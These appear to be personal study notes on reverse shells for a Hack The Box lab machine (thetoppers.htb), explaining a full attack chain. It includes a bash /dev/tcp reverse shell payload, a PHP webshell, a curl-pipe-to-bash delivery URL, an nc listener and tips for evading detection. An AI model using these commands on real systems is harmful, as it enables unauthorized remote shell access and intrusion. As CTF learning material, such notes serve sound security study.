# Reverse Shells

Tags: #reverse-shell #rce #bash #networking #htb

---

## Normal Shell vs Reverse Shell

**Normal shell (e.g. SSH):** You initiate the connection to the server.

```
You (Kali) ──connects to──► Server
```

**Reverse shell:** The target initiates the connection back to you.

```
You (Kali) ◄──connects back── Server
```

### Why reverse?

Firewalls block **incoming** connections to servers, but allow **outgoing** ones (otherwise the server couldn't browse the internet or download updates).

```
Normal shell:   You → Server   ← BLOCKED by firewall
Reverse shell:  You ← Server   ← ALLOWED (outgoing traffic)
```

By making the server connect to _you_, you bypass the firewall entirely.

---

## The Three Pieces

```
1. LISTENER on your machine      → waits for the target to connect
2. PAYLOAD on the target         → makes the target connect back to you
3. DELIVERY method               → makes the target execute the payload
```

---

## Step by Step

### 1. Find your tun0 IP (in your machine)

```bash
ifconfig tun0
# or
ip a show tun0
```

This is the IP the target needs to connect back to — your HTB VPN address.

### 2. Create the payload (in your machine)

```bash
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/YOUR_TUN0_IP/1337 0>&1' >> shell.sh
```

### 3. Host it on a local web server (in your machine)

```bash
# Run from the directory containing shell.sh
python3 -m http.server 8000
```

This lets the target download the file from your machine.

### 4. Start a listener (new terminal) (in your machine)

```bash
nc -nvlp 1337
```

This waits for the target to connect on port 1337.

### 5. Deliver the payload via webshell (in THE TARGET machine)
via browser
```bash
http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash
```
or with the terminal 
```bash
curl -G "http://thetoppers.htb/shell.php" \ --data-urlencode "cmd=curl http://YOUR_TUN0_IP:8000/shell.sh | bash"
```

or in the [[Burp Suite]]:
```bash
curl%20<YOUR_IP_HERE>:<PORT>/shell.sh|bash
```

This tells the target to: download shell.sh from your machine → pipe it to bash → execute it.curl -G "http://thetoppers.htb/shell.php" \ --data-urlencode "cmd=curl http://YOUR_TUN0_IP:8000/shell.sh | bash"
See [[Obsidian-University/University/Magistrale/Ethical Hacking/For Passion/Hacking Linux/Reverse Shells#What that full url means|here]] for details
### 6. You receive the shell

Your `nc` terminal will show:

```
connect to [YOUR_IP] from (UNKNOWN) [TARGET_IP] ...
www-data@three:/var/www/html$
```

You now have a full interactive shell on the target.

### Dopo aver ottenuto una shell, potresti renderla interattiva con 

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

ovviamente con `bash -i` la rendi interattiva già di suo

---

## Breaking Down the Payload

```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

|Part|Meaning|
|---|---|
|`bash -i`|Open an interactive bash shell|
|`/dev/tcp/IP/PORT`|Linux special file — opening it creates a TCP connection to IP:PORT|
|`>&`|Redirect bash output into that TCP connection (sends it to you)|
|`0>&1`|Also redirect input from the same connection (receives your commands)|

### What is `/dev/tcp`?

In Linux, **everything is a file** — including network connections. `/dev/tcp` is a bash built-in that lets you open a TCP connection just by treating it as a file path:

```
/dev/tcp/10.10.14.5/1337
          │         │
          │         └── port number
          └── IP to connect to
```

### What is `0>&1`?

- `0` = stdin (input)
- `1` = stdout (output)

Without `0>&1`, bash would send output to you but wouldn't receive your commands back. This line wires up two-way communication:

```
You type in nc → travels over TCP → bash receives as input
Bash output    → travels over TCP → appears in your nc terminal
```

---

## The Full Communication Flow

```
YOUR KALI                              HTB MACHINE
──────────────────────                 ──────────────────────
nc -nvlp 1337                          bash -i >& /dev/tcp/YOUR_IP/1337 0>&1
"waiting for connection..."      ◄───  "connecting to YOUR_IP:1337"

You type: whoami                 ────► bash executes: whoami
                                 ◄───  returns: www-data

You type: cat /var/www/flag.txt  ────► bash executes: cat /var/www/flag.txt
                                 ◄───  returns: flag content
```

---

## Webshell vs Reverse Shell

| |Webshell|Reverse Shell|
|---|---|---|
|Interaction|One command per HTTP request|Full interactive terminal|
|Persistence|Dies after each request|Stays open like SSH|
|Autocomplete|✗|✓|
|Interactive programs|✗|✓|
|Firewall bypass|Needs port 80 open|Needs outgoing traffic allowed|
|Ease of setup|Very easy|Slightly more steps|

---

## Tools

|Tool|Purpose|
|---|---|
|`nc -nvlp PORT`|Start a listener on your machine|
|`python3 -m http.server 8000`|Host files for the target to download|
|`curl URL \| bash`|Download and execute a remote script in one step|
|`/dev/tcp/IP/PORT`|Bash built-in for TCP connections (no tools needed on target)|

### nc flags explained

```
-n   no DNS resolution (faster)
-v   verbose (shows connection info)
-l   listen mode
-p   specify port
```

---

## Common Ports to Use

Avoid well-known ports. Good choices:

- `1337` — common in CTFs
- `4444` — common in CTFs
- `9001` — common in CTFs
- `443` — looks like HTTPS traffic, less likely to be blocked

---

## Key Takeaways

- Reverse shells bypass firewalls by making the **target connect to you**
- You need your **tun0 IP** (HTB VPN address) — not your local LAN IP
- Three components always needed: **listener + payload + delivery**
- `/dev/tcp` is a bash built-in — no extra tools needed on the target
- A reverse shell is far more powerful than a webshell for post-exploitation

---

# What that full url means

Let's break it into every single piece.

---

## The full URL structure

```
http://thetoppers.htb/shell.php ? cmd = curl%20<IP>:8000/shell.sh|bash
│                        │         │     │
│                        │         │     └── the actual command
│                        │         └── parameter name our webshell reads
│                        └── our webshell
└── the target server
```

---

## Part 1: `http://thetoppers.htb/shell.php`

This is just visiting our webshell. Remember it contains:

```php
<?php system($_GET["cmd"]); ?>
```

It takes whatever is in `cmd` and runs it as a terminal command on the server.

---

## Part 2: `?cmd=`

The `?` marks the start of **URL parameters** — key/value pairs sent to the page. Our webshell reads the `cmd` parameter and executes it.

---

## Part 3: `%20`

Just a **space** in URL encoding. So:

```
curl%20<IP>:8000/shell.sh
= curl <IP>:8000/shell.sh
```

---

## Part 4: `curl <IP>:8000/shell.sh`

This runs on the **target machine**. It says:

> "Connect to MY Kali machine on port 8000 and download shell.sh"

Remember we hosted that file with:

```bash
python3 -m http.server 8000
```

So the target reaches out to our machine and fetches the reverse shell script. At this point it's just downloaded into memory — not executed yet.

---

## Part 5: `|bash`

The pipe `|` takes the **output of the left command** and passes it as **input to the right command**.

```
curl downloads shell.sh content
        │
        │ (pipe)
        ▼
bash receives the content and executes it
```

So instead of saving shell.sh to disk first, it gets executed immediately in memory. Cleaner and leaves fewer traces.

---

## The Full Chain

```
You visit the URL
        ↓
PHP reads cmd parameter
        ↓
system() runs: curl <YOUR_IP>:8000/shell.sh | bash
        ↓
curl reaches out to YOUR Kali on port 8000
        ↓
python3 http.server serves shell.sh
        ↓
Content of shell.sh travels back to target
        ↓
bash executes it:
bash -i >& /dev/tcp/<YOUR_IP>/1337 0>&1
        ↓
Target connects back to YOUR Kali on port 1337
        ↓
nc -nvlp 1337 receives the connection
        ↓
You have a full interactive shell 🎉
```

---

## Why host it remotely instead of uploading directly?

You could upload the script to the S3 bucket and execute it from there. But this approach is cleaner because:

- **Nothing is written to disk** on the target — harder to detect
- **No need for S3** — works on any machine where you have code execution
- **Faster** — one URL visit triggers everything

It's a very common real-world technique called a **fileless attack** — the malicious code never touches the target's disk.